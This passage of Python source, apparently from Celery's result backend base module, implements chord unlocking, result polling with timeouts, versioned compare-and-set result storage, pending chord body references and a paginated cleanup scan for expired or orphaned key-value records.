        this method or return a degraded report rather than guessing.
        """
        if self.supports_autoexpire:
            return CleanupReport(
                cursor=cursor,
                next_cursor=cursor,
                degraded=['native_autoexpire'],
            )
        if self.app.conf.get('result_backend_cleanup_strict'):
            raise BackendCapabilityError(
                f'{type(self).__name__} does not support result cleanup scans')
        return CleanupReport(
            cursor=cursor,
            next_cursor=cursor,
            degraded=['unsupported_cleanup_scan'],
        )

    def save_pending_body_reference(self, chord_id, body, result_ids=None,
                                    ttl=None):
        """Store a reference that keeps pending chord work reachable."""
        return None

    def delete_pending_body_reference(self, chord_id):
        """Delete a pending chord body reference."""
        return None

    def process_cleanup(self):
        """Cleanup actions to do at the end of a task worker process."""

    def on_task_call(self, producer, task_id):
        return {}

    def add_to_chord(self, chord_id, result):
        raise NotImplementedError('Backend does not support add_to_chord')

    def on_chord_part_return(self, request, state, result, **kwargs):
        pass

    def set_chord_size(self, group_id, chord_size):
        pass

    def fallback_chord_unlock(self, header_result, body, countdown=1,
                              **kwargs):
        kwargs['result'] = [r.as_tuple() for r in header_result]
        try:
            body_type = getattr(body, 'type', None)
        except NotRegistered:
            body_type = None

        queue = body.options.get('queue', getattr(body_type, 'queue', None))

        if queue is None:
            # fallback to default routing if queue name was not
            # explicitly passed to body callback
            queue = self.app.amqp.router.route(kwargs, body.name)['queue'].name

        priority = body.options.get('priority', getattr(body_type, 'priority', 0))

        stamps = body.options.get('stamped_headers', ())
        routing_options = {}
        for option in ('exchange', 'exchange_type', 'routing_key', 'headers'):
            if option in stamps:
                continue
            value = body.options.get(option)
            if value is not None:
                routing_options[option] = value

        if 'exchange_type' not in routing_options:
            try:
                queue_obj = self.app.amqp.queues[queue] if isinstance(queue, str) else queue
                routing_options['exchange_type'] = queue_obj.exchange.type
            except (AttributeError, KeyError):
                pass
        if 'exchange_type' in routing_options:
            # unlock_chord needs this for retries.
            kwargs['_chord_unlock_exchange_type'] = routing_options['exchange_type']

        self.app.tasks['celery.chord_unlock'].apply_async(
            (header_result.id, body,), kwargs,
            countdown=countdown,
            queue=queue,
            priority=priority,
            **routing_options,
        )

    def ensure_chords_allowed(self):
        pass

    def apply_chord(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        self.save_pending_body_reference(
            header_result.id,
            body,
            [result.id for result in header_result.results],
        )
        self.fallback_chord_unlock(header_result, body, **kwargs)

    def current_task_children(self, request=None):
        request = request or getattr(get_current_task(), 'request', None)
        if request:
            return [r.as_tuple() for r in getattr(request, 'children', [])]

    def __reduce__(self, args=(), kwargs=None):
        kwargs = {} if not kwargs else kwargs
        return (unpickle_backend, (self.__class__, args, kwargs))


class SyncBackendMixin:
    def iter_native(self, result, timeout=None, interval=0.5, no_ack=True,
                    on_message=None, on_interval=None):
        self._ensure_not_eager()
        results = result.results
        if not results:
            return

        task_ids = set()
        for result in results:
            if isinstance(result, ResultSet):
                yield result.id, result.results
            else:
                task_ids.add(result.id)

        yield from self.get_many(
            task_ids,
            timeout=timeout, interval=interval, no_ack=no_ack,
            on_message=on_message, on_interval=on_interval,
        )

    def wait_for_pending(self, result, timeout=None, interval=0.5,
                         no_ack=True, on_message=None, on_interval=None,
                         callback=None, propagate=True):
        self._ensure_not_eager()
        if on_message is not None:
            raise ImproperlyConfigured(
                'Backend does not support on_message callback')

        meta = self.wait_for(
            result.id, timeout=timeout,
            interval=interval,
            on_interval=on_interval,
            no_ack=no_ack,
        )
        if meta:
            result._maybe_set_cache(meta)
            return result.maybe_throw(propagate=propagate, callback=callback)

    def wait_for(self, task_id,
                 timeout=None, interval=0.5, no_ack=True, on_interval=None):
        """Wait for task and return its result.

        If the task raises an exception, this exception
        will be re-raised by :func:`wait_for`.

        Raises:
            celery.exceptions.TimeoutError:
                If `timeout` is not :const:`None`, and the operation
                takes longer than `timeout` seconds.
        """
        self._ensure_not_eager()

        time_elapsed = 0.0

        while 1:
            meta = self.get_task_meta(task_id)
            if meta['status'] in states.READY_STATES:
                return meta
            if on_interval:
                on_interval()
            if timeout is not None and time_elapsed >= timeout:
                raise TimeoutError('The operation timed out.')
            # avoid hammering the CPU checking status. Never sleep past the
            # deadline: with the sleep first, timeout=0 blocked for a whole
            # interval before giving up, and any timeout below interval
            # overshot to interval.
            nap = interval if timeout is None else min(interval, timeout - time_elapsed)
            time.sleep(nap)
            time_elapsed += nap

    def add_pending_result(self, result, weak=False):
        return result

    def remove_pending_result(self, result):
        return result

    @property
    def is_async(self):
        return False


class BaseBackend(Backend, SyncBackendMixin):
    """Base (synchronous) result backend."""


BaseDictBackend = BaseBackend  # XXX compat


class BaseKeyValueStoreBackend(Backend):
    key_t = ensure_bytes
    task_keyprefix = 'celery-task-meta-'
    group_keyprefix = 'celery-taskset-meta-'
    chord_keyprefix = 'chord-unlock-'
    implements_incr = False
    supports_result_ttl = False
    supports_conditional_delete = True
    supports_manual_cleanup = False
    atomic_store_attempts = 3

    def __init__(self, *args, **kwargs):
        if hasattr(self.key_t, '__func__'):  # pragma: no cover
            self.key_t = self.key_t.__func__  # remove binding
        super().__init__(*args, **kwargs)
        self._add_global_keyprefix()
        self._encode_prefixes()
        if self.implements_incr:
            self.apply_chord = self._apply_chord_incr

    def _add_global_keyprefix(self):
        """
        This method prepends the global keyprefix to the existing keyprefixes.

        This method checks if a global keyprefix is configured in `result_backend_transport_options` using the
        `global_keyprefix` key. If so, then it is prepended to the task, group and chord key prefixes.
        """
        global_keyprefix = self.app.conf.get('result_backend_transport_options', {}).get("global_keyprefix", None)
        if global_keyprefix:
            if global_keyprefix[-1] not in ':_-.':
                global_keyprefix += '_'
            self.task_keyprefix = f"{global_keyprefix}{self.task_keyprefix}"
            self.group_keyprefix = f"{global_keyprefix}{self.group_keyprefix}"
            self.chord_keyprefix = f"{global_keyprefix}{self.chord_keyprefix}"

    def _encode_prefixes(self):
        self.task_keyprefix = self.key_t(self.task_keyprefix)
        self.group_keyprefix = self.key_t(self.group_keyprefix)
        self.chord_keyprefix = self.key_t(self.chord_keyprefix)

    def get(self, key):
        raise NotImplementedError('Must implement the get method.')

    def mget(self, keys):
        raise NotImplementedError('Does not support get_many')

    def _set_with_state(self, key, value, state):
        self.set(key, value)

    def set(self, key, value):
        raise NotImplementedError('Must implement the set method.')

    def delete(self, key):
        raise NotImplementedError('Must implement the delete method')

    def incr(self, key):
        raise NotImplementedError('Does not implement incr')

    def expire(self, key, value):
        pass

    def get_key_for_task(self, task_id, key=''):
        """Get the cache key for a task by id."""
        if not task_id:
            raise ValueError(f'task_id must not be empty. Got {task_id} instead.')
        return self._get_key_for(self.task_keyprefix, task_id, key)

    def get_key_for_group(self, group_id, key=''):
        """Get the cache key for a group by id."""
        if not group_id:
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.group_keyprefix, group_id, key)

    def get_key_for_chord(self, group_id, key=''):
        """Get the cache key for the chord waiting on group with given id."""
        if not group_id:
            raise ValueError(f'group_id must not be empty. Got {group_id} instead.')
        return self._get_key_for(self.chord_keyprefix, group_id, key)

    def _get_key_for(self, prefix, id, key=''):
        key_t = self.key_t
        if isinstance(id, UUID):
            id = str(id)

        return key_t('').join([
            prefix, key_t(id), key_t(key),
        ])

    def _strip_prefix(self, key):
        """Take bytes: emit string."""
        key = self.key_t(key)
        for prefix in self.task_keyprefix, self.group_keyprefix:
            if key.startswith(prefix):
                return bytes_to_str(key[len(prefix):])
        return bytes_to_str(key)

    def _filter_ready(self, values, READY_STATES=states.READY_STATES):
        for k, value in values:
            if value is not None:
                value = self.decode_result(value)
                if value['status'] in READY_STATES:
                    yield k, value

    def _mget_to_results(self, values, keys, READY_STATES=states.READY_STATES):
        if hasattr(values, 'items'):
            # client returns dict so mapping preserved.
            return {
                self._strip_prefix(k): v
                for k, v in self._filter_ready(values.items(), READY_STATES)
            }
        else:
            # client returns list so need to recreate mapping.
            return {
                bytes_to_str(keys[i]): v
                for i, v in self._filter_ready(enumerate(values), READY_STATES)
            }

    def get_many(self, task_ids, timeout=None, interval=0.5, no_ack=True,
                 on_message=None, on_interval=None, max_iterations=None,
                 READY_STATES=states.READY_STATES):
        interval = 0.5 if interval is None else interval
        ids = task_ids if isinstance(task_ids, set) else set(task_ids)
        cached_ids = set()
        cache = self._cache
        for task_id in ids:
            try:
                cached = cache[task_id]
            except KeyError:
                pass
            else:
                if cached['status'] in READY_STATES:
                    yield bytes_to_str(task_id), cached
                    cached_ids.add(task_id)

        ids.difference_update(cached_ids)
        iterations = 0
        time_elapsed = 0.0
        while ids:
            keys = list(ids)
            r = self._mget_to_results(self.mget([self.get_key_for_task(k)
                                                 for k in keys]), keys, READY_STATES)
            cache.update(r)
            ids.difference_update({bytes_to_str(v) for v in r})
            for key, value in r.items():
                if on_message is not None:
                    on_message(value)
                yield bytes_to_str(key), value
            if not ids:
                # everything asked for has been handed back, so there is
                # nothing left to time out on. wait_for checks the same way,
                # returning a ready result before it looks at the deadline.
                break
            if timeout is not None and time_elapsed >= timeout:
                raise TimeoutError(f'Operation timed out ({timeout})')
            if on_interval:
                on_interval()
            # don't busy loop, and never sleep past the deadline: with the
            # deadline counted in whole intervals, timeout=0 waited forever
            # and any timeout below interval overshot to interval.
            nap = interval if timeout is None else min(interval,
                                                       timeout - time_elapsed)
            time.sleep(nap)
            time_elapsed += nap
            iterations += 1
            if max_iterations and iterations >= max_iterations:
                break

    def _forget(self, task_id):
        self.delete(self.get_key_for_task(task_id))

    def _store_result(self, task_id, result, state,
                      traceback=None, request=None, **kwargs):
        self.require_atomic_result_updates()
        key = self.get_key_for_task(task_id)
        for _ in range(self.atomic_store_attempts):
            current_payload = self.get(key)
            current_meta = self._get_task_meta_for(task_id)
            current_version = current_meta.get('version')
            if not self._state_can_replace(current_meta.get('status'), state):
                return result

            ttl_key = (
                'children'
                if request and getattr(request, 'parent_id', None)
                else state
            )
            ttl = self.result_ttl_for(ttl_key)
            version = self._new_result_version()
            meta = self._get_result_meta(
                result=result,
                state=state,
                traceback=traceback,
                request=request,
                version=version,
                ttl=ttl,
            )
            meta['task_id'] = bytes_to_str(task_id)
            payload = self.encode(meta)

            try:
                stored = self._compare_and_set_result(
                    key=key,
                    payload=payload,
                    state=state,
                    expected_version=current_version,
                    expected_status=current_meta.get('status'),
                    ttl=ttl,
                    expected_payload=current_payload,
                )
            except BackendStoreError as ex:
                raise BackendStoreError(
                    str(ex), state=state, task_id=task_id) from ex
            if stored:
                return result
        raise BackendStoreError(
            'failed to store result after conflicting retries',
            state=state, task_id=task_id,
        )

    def _compare_and_set_result(self, key, payload, state, expected_version,
                                expected_status, ttl=None,
                                expected_payload=None):
        with self._state_lock:
            task_id = bytes_to_str(key[len(self.task_keyprefix):])
            if self.get(key) != expected_payload:
                return False
            current_meta = self._get_task_meta_for(task_id)
            current_version = current_meta.get('version')
            current_status = current_meta.get('status')
            if current_version != expected_version or current_status != expected_status:
                return False
            self._set_with_state(key, payload, state)
            if ttl:
                self.expire(key, ttl)
            return True

    def _save_group(self, group_id, result):
        version = self._new_result_version()
        updated_at = self._current_time()
        ttl = self.result_ttl_for('group')
        meta = {
            'result': result.as_tuple(),
            'version': version,
            'updated_at': self._isoformat(updated_at),
            'ttl': ttl,
            'kind': RESULT_KIND_GROUP,
        }
        self._set_with_state(
            self.get_key_for_group(group_id),
            self.encode(meta), states.SUCCESS,
        )
        if ttl:
            self.expire(self.get_key_for_group(group_id), ttl)
        return result

    def _delete_group(self, group_id):
        self.delete(self.get_key_for_group(group_id))

    def save_pending_body_reference(self, chord_id, body, result_ids=None,
                                    ttl=None):
        if body is None:
            return None
        body_data = dict(body) if isinstance(body, Mapping) else body
        ttl = ttl if ttl is not None else self.result_ttl_for('pending_body')
        payload = {
            'kind': RESULT_KIND_PENDING,
            'version': self._new_result_version(),
            'updated_at': self._isoformat(self._current_time()),
            'ttl': ttl,
            'chord_id': chord_id,
            'body': body_data,
            'result_ids': list(result_ids or []),
        }
        self._set_with_state(
            self.get_key_for_group(chord_id, PENDING_REF_SUFFIX),
            self.encode(payload), states.PENDING,
        )
        if ttl:
            self.expire(self.get_key_for_group(chord_id, PENDING_REF_SUFFIX), ttl)
        return payload

    def delete_pending_body_reference(self, chord_id):
        self.delete(self.get_key_for_group(chord_id, PENDING_REF_SUFFIX))

    def _get_task_meta_for(self, task_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_task(task_id))
        if not meta:
            return {'status': states.PENDING, 'result': None}
        return self.decode_result(meta)

    def task_result_exists(self, task_id):
        """Check if a result exists in the backend for the given task ID.

        This overrides the base implementation to directly check for
        the existence of the key in the store, which is more accurate
        than checking the status since tasks stored with PENDING status
        would still be detected.

        .. versionadded:: 5.7.0

        Returns:
            bool: :const:`True` if the backend has a result for the task,
                :const:`False` otherwise.
        """
        return bool(self.get(self.get_key_for_task(task_id)))

    def _restore_group(self, group_id):
        """Get task meta-data for a task by id."""
        meta = self.get(self.get_key_for_group(group_id))
        # previously this was always pickled, but later this
        # was extended to support other serializers, so the
        # structure is kind of weird.
        if meta:
            meta = self.decode(meta)
            result = meta['result']
            meta['result'] = result_from_tuple(result, self.app)
            return meta

    def iter_cleanup_keys(self, cursor=None):
        raise NotImplementedError('backend does not support key enumeration')

    def _classify_cleanup_key(self, key):
        text_key = bytes_to_str(key)
        task_prefix = bytes_to_str(self.task_keyprefix)
        group_prefix = bytes_to_str(self.group_keyprefix)
        chord_prefix = bytes_to_str(self.chord_keyprefix)
        if text_key.startswith(task_prefix) and not text_key.endswith('.v'):
            return RESULT_KIND_TASK
        if text_key.startswith(group_prefix):
            if text_key.endswith(PENDING_REF_SUFFIX):
                return RESULT_KIND_PENDING
            if any(text_key.endswith(suffix) for suffix in CHORD_COUNTER_SUFFIXES):
                return RESULT_KIND_CHORD
            return RESULT_KIND_GROUP
        if text_key.startswith(chord_prefix):
            return RESULT_KIND_CHORD
        return None

    def _decode_cleanup_record(self, key, kind):
        value = self.get(key)
        if not value:
            return None
        if kind in (RESULT_KIND_GROUP, RESULT_KIND_PENDING):
            return self.decode(value)
        if kind == RESULT_KIND_CHORD:
            text_key = bytes_to_str(key)
            updated_at = None
            ttl = self.result_ttl_for('chord')
            if text_key.endswith(('.j', '.l')):
                try:
                    self.decode(value)
                except Exception:
                    pass
            return {
                'kind': RESULT_KIND_CHORD,
                'updated_at': updated_at,
                'ttl': ttl,
            }
        return self.decode_result(value)

    @staticmethod
    def _collect_record_references(record, kind):
        references = set()
        if not isinstance(record, dict):
            return references

        if kind == RESULT_KIND_PENDING:
            references.update(str(item) for item in record.get('result_ids', ()))
            body = record.get('body')
            if isinstance(body, Mapping):
                options = body.get('options') or {}
                body_id = options.get('task_id')
                if body_id:
                    references.add(str(body_id))
            return references

        if kind == RESULT_KIND_TASK:
            for child in record.get('children') or ():
                BaseKeyValueStoreBackend._collect_tuple_references(child, references)
            return references

        if kind != RESULT_KIND_GROUP:
            return references
        result = record.get('result')
        if not isinstance(result, (list, tuple)) or len(result) < 2:
            return references
        tasks = result[1] or ()
        for task in tasks:
            BaseKeyValueStoreBackend._collect_tuple_references(task, references)
        return references

    @staticmethod
    def _collect_tuple_references(node, references):
        if isinstance(node, (list, tuple)):
            if (
                len(node) == 2 and
                isinstance(node[0], (list, tuple)) and node[0] and
                isinstance(node[0][0], str) and node[1] is None
            ):
                references.add(node[0][0])
            for child in node:
                BaseKeyValueStoreBackend._collect_tuple_references(
                    child, references)

    def _cleanup_delete(self, key, kind, record, event):
        if kind in (RESULT_KIND_GROUP, RESULT_KIND_PENDING):
            return self._delete_key_if_version(key, record.get('version'))
        if kind == RESULT_KIND_TASK:
            expected_payload = self.get(key)
            return self._delete_result_if_unchanged(
                key, record.get('version'), record.get('status'),
                expected_payload=expected_payload)
        self.delete(key)
        return True

    def _delete_result_if_unchanged(self, key, version, status,
                                    expected_payload=None):
        with self._state_lock:
            if self.get(key) != expected_payload:
                return False
            meta = self._get_task_meta_for(
                bytes_to_str(key[len(self.task_keyprefix):]))
            if meta.get('version') != version or meta.get('status') != status:
                return False
            self.delete(key)
            return True

    def _delete_key_if_version(self, key, version):
        value = self.get(key)
        if not value:
            return True
        if self.decode(value).get('version') != version:
            return False
        self.delete(key)
        return True

    def cleanup(self, cursor=None, batch_size=None):
        if self.supports_autoexpire and not self.supports_manual_cleanup:
            return CleanupReport(
                cursor=cursor, next_cursor=cursor,
                degraded=['native_autoexpire'])
        try:
            all_keys = list(self.iter_cleanup_keys())
        except NotImplementedError:
            if self.app.conf.get('result_backend_cleanup_strict'):
                raise BackendCapabilityError(
                    f'{type(self).__name__} does not support result cleanup scans')
            return CleanupReport(
                cursor=cursor, next_cursor=cursor,
                degraded=['unsupported_cleanup_scan'])

        batch_size = int(batch_size or self.cleanup_batch_size)
        now = self._current_time()
        report = CleanupReport(cursor=cursor)
        for kind in RESULT_KIND_KEYS:
            report.deleted[kind] = 0
            report.retained[kind] = 0

        indexed_records = []
        referenced = set()
        start_index = 0
        if cursor is not None:
            start_index = next(
                (index for index, key in enumerate(all_keys)
                 if bytes_to_str(key) > cursor),
                len(all_keys),
            )

        for key in all_keys:
            kind = self._classify_cleanup_key(key)
            if kind in (RESULT_KIND_TASK, RESULT_KIND_GROUP,
                        RESULT_KIND_PENDING):
                record = self._decode_cleanup_record(key, kind)
                if record is not None:
                    referenced.update(
                        self._collect_record_references(record, kind))
        if cursor is None:
            for key in all_keys:
                kind = self._classify_cleanup_key(key)
                if kind in (RESULT_KIND_GROUP, RESULT_KIND_PENDING):
                    record = self._decode_cleanup_record(key, kind)
                    if record is not None:
                        self._cleanup_record(
                            key, kind, record, referenced, now, None, report)
        for index, key in enumerate(all_keys):
            kind = self._classify_cleanup_key(key)
            if kind is None:
                continue
            record = self._decode_cleanup_record(key, kind)
            if record is None:
                continue
            if index < start_index:
                continue
            indexed_records.append((index, key, kind, record))
        batch = indexed_records[:batch_size]
        for index, key, kind, record in batch:
            if kind == RESULT_KIND_TASK:
                self._cleanup_record(
                    key, kind, record, referenced, now, None, report)

        if batch:
            report.next_cursor = bytes_to_str(batch[-1][1])
            last_index = batch[-1][0]
            if len(batch) < batch_size or last_index >= len(all_keys) - 1:
                report.next_cursor = None
        else:
            report.next_cursor = None
        return report

    def _cleanup_record(self, key, kind, record, referenced, now,
                        cursor, report):
        status = record.get('status')
        expired, ttl, age = self._is_meta_expired(record, kind, now)
        text_key = bytes_to_str(key)
        if kind == RESULT_KIND_TASK:
            identifier = text_key[len(bytes_to_str(self.task_keyprefix)):]
            if identifier in referenced:
                report.retained[kind] += 1
                return
        reason = CLEANUP_REASON_TTL
        if kind == RESULT_KIND_PENDING and not expired:
            body = record.get('body')
            body_options = body.get('options', {}) if isinstance(body, Mapping) else {}
            body_id = body_options.get('task_id')
            if body_id:
                body_meta = self._get_task_meta_for(body_id)
                if body_meta.get('status') in self.READY_STATES:
                    reason = CLEANUP_REASON_ORPHAN
                else:
                    report.retained[kind] += 1
                    return
            else:
                report.retained[kind] += 1
                return
        if not expired and reason == CLEANUP_REASON_TTL:
            report.retained[kind] += 1
            return
        event = cleanup_event_t(
            kind=kind, key=text_key, reason=reason,
            ttl=ttl, age=age, status=status, cursor=cursor,
        )
        if self._cleanup_delete(key, kind, record, event):
            report.events.append(event)
            report.deleted[kind] += 1
        else:
            report.retained[kind] += 1

    def _apply_chord_incr(self, header_result_args, body, **kwargs):
        self.ensure_chords_allowed()
        header_result = self.app.GroupResult(*header_result_args)
        header_result.save(backend=self)

    def on_chord_part_return(self, request, state, result, **kwargs):
        if not self.implements_incr:
            return
        app = self.app
        gid = request.group
        if not gid:
            return
        key = self.get_key_for_chord(gid)
        try:
            deps = GroupResult.restore(gid, backend=self)
        except Exception as exc:  # pylint: disable=broad-except
            callback = maybe_signature(request.chord, app=app)
            logger.exception('Chord %r raised: %r', gid, exc)
            return self.chord_error_from_stack(
                callback,
                ChordError(f'Cannot restore group: {exc!r}'),
            )
        if deps is None:
            try:
                raise ValueError(gid)
            except ValueError as exc:
                callback = maybe_signature(request.chord, app=app)
                logger.exception('Chord callback %r raised: %r', gid, exc)
                return self.chord_error_from_stack(
                    callback,
                    ChordError(f'GroupResult {gid} no longer exists'),
                )
        val = self.incr(key)
        # Set the chord size to the value defined in the request, or fall back
        # to the number of dependencies we can see from the restored result
        size = request.chord.get("chord_size")
        if size is None:
            size = len(deps)
        if val > size:  # pragma: no cover
            logger.warning('Chord counter incremented too many times for %r',
                           gid)
        elif val == size:
            callback = maybe_signature(request.chord, app=app)
            j = deps.join_native if deps.supports_native_join else deps.join
            try:
                with allow_join_result():
                    ret = j(
                        timeout=app.conf.result_chord_join_timeout,
                        propagate=True)
            except Exception as exc:  # pylint: disable=broad-except
                try:
                    culprit = next(deps._failed_join_report())
                    reason = 'Dependency {0.id} raised {1!r}'.format(
                        culprit, exc,
                    )
                except StopIteration:
                    reason = repr(exc)
                logger.exception('Chord %r raised: %r', gid, reason)
                chord_error = _create_chord_error_with_cause(message=reason, original_exc=exc)
                self.chord_error_from_stack(callback=callback, exc=chord_error)
            else:
                try:
                    callback.delay(ret)
                except Exception as exc:  # pylint: disable=broad-except
                    logger.exception('Chord %r raised: %r', gid, exc)
                    chord_error = _create_chord_error_with_cause(
                        message=f'Callback error: {exc!r}', original_exc=exc
                    )
                    self.chord_error_from_stack(callback=callback, exc=chord_error)
                else:
                    self.delete_pending_body_reference(gid)
            finally:
                deps.delete()
                self.delete(key)
        else:
            self.expire(key, self.expires)


class KeyValueStoreBackend(BaseKeyValueStoreBackend, SyncBackendMixin):
    """Result backend base class for key/value stores."""


class DisabledBackend(BaseBackend):
    """Dummy result backend."""

    _cache = {}  # need this attribute to reset cache in tests.

    def store_result(self, *args, **kwargs):
        pass

    def ensure_chords_allowed(self):
        raise NotImplementedError(E_CHORD_NO_BACKEND.strip())

    def _is_disabled(self, *args, **kwargs):
        raise NotImplementedError(E_NO_BACKEND.strip())

    def as_uri(self, *args, **kwargs):
        return 'disabled://'

    get_state = get_status = get_result = get_traceback = _is_disabled
    get_task_meta_for = wait_for = get_many = _is_disabled
